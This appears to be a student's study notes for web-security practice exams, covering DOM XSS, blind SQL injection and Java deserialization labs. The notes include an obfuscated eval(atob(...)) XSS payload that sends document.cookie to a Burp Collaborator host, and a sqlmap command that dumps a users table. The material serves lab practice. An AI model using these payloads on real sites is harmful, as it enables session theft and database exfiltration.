- https://www.youtube.com/watch?v=_HkRydBR_DA

### Practice exam 1
### DOM XSS
- encoded in base64: `fetch("https://<burpcollaborator url.com>/"+document.cookie)`

- to obtain session cookie (breaks out of JSON):
```javascript
test"};eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5jb20vIitkb2N1bWVudC5jb29raWUp"))//
```

- used CSRF PoC generator (burp pro)

### Blind SQL injection (boolean based)
- sqlmap:
```bash
sqlmap -u 'url' --batch -level 5 -H 'Cookie: session=...; _lab=...' --proxy http://localhost:8080 --dbms postgres -D public -T users --dump
```


### Java Deserialization Vulnerability
- [cyberchef](https://gchq.github.io/CyberChef/) - to analyze the encoded cookie
- [ysoserial](https://github.com/frohoff/ysoserial)
- [Burp Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae)
- the secret was exfiltrated using collaborator

### Practice exam 2
- [xss - payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)